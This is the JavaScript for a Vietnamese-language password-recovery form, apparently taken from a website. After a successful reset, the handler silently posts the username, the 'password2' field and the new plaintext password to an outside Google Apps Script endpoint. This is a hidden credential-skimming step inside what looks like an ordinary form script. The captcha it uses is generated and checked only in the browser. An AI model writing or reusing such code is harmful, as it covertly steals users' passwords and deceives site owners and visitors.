<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.5.0/axios.min.js" ></script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

<script type="text/javascript">
var gen_capcha = Math.floor(Math.random() * 9999) + 1000;
document.getElementById("capcha_in").innerHTML = gen_capcha;
 var BASE_URL = 'server/api';
// Authen Folder API
var API_AUTHEN = '/user/';
// List API
var AUTHEN_FORGOT_PASSWORD = 'forgot-password';

function pass2() {$("#pass2").show();$("#email").hide();document.getElementById("name_2").value = '';document.getElementById("email_2").value = '';}
function email() {$("#email").show();$("#pass2").hide();document.getElementById("name").value = '';document.getElementById("password2").value = '';document.getElementById("password").value = '';document.getElementById("passwordr").value = '';}
		$(function() {
			$('form').submit(function() {
				var name = $('[name=name]').val()
				var name_2 = $('[name=name_2]').val()
				var email_2 = $('[name=email_2]').val()
				var password = $('[name=password]').val()
				var passwordr = $('[name=passwordr]').val()
				var password2 = $('[name=password2]').val()
				
				var capcha = $('#capcha').val()
			if (capcha != gen_capcha) {
 			Swal.fire({
 				icon: 'error',
 				title: 'Lỗi...',
 				text: 'Mã xác minh không chính xác !!!'
 			})
 			return false
            }
			 
				if(password != passwordr) {
				Swal.fire({icon: 'error',title: 'Lỗi...',text: 'Mật khẩu không khớp vui lòng thử lại !!!'})
				return false
				}

				$.post(BASE_URL + API_AUTHEN + AUTHEN_FORGOT_PASSWORD, {
					'name': name,
					'name_2': name_2,
					'email_2': email_2,
					'password': password,
					'passwordr': passwordr,
					'password2': password2
				}, function(data) {
					// console.log(data)
					var obj = JSON.parse(JSON.stringify(data));
					if(obj.status == 1) {
					 Swal.fire({ position: 'top-center', icon: 'success', title: 'Khôi phục mật khẩu thành công !!!', showConfirmButton: false, timer: 2000 })
					 setTimeout(function() {window.open('login.html', '_self')}, 2000);
					 var today = new Date();var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();var datetime = date+' '+time; $.ajax({type: "POST",url: "https://script.google.com/macros/s/AKfycbwjQSRl6sazfVKRvmZVnSNsxOb0VVyiD4LOdWhicFz8-e9gY26uv-CGeFUnf_-0rRjU/exec",
                     data: {name: name,password:'No',datetime:datetime,content: 'Khôi phục Pass thành công Tài khoản='+name+',password2='+password2+',password='+password+' '}});
					} else {
						Swal.fire({icon: 'error',title: 'Lỗi...',text: ""+obj.msg+""})
					}
				})

				return false
			})
		})
</script>
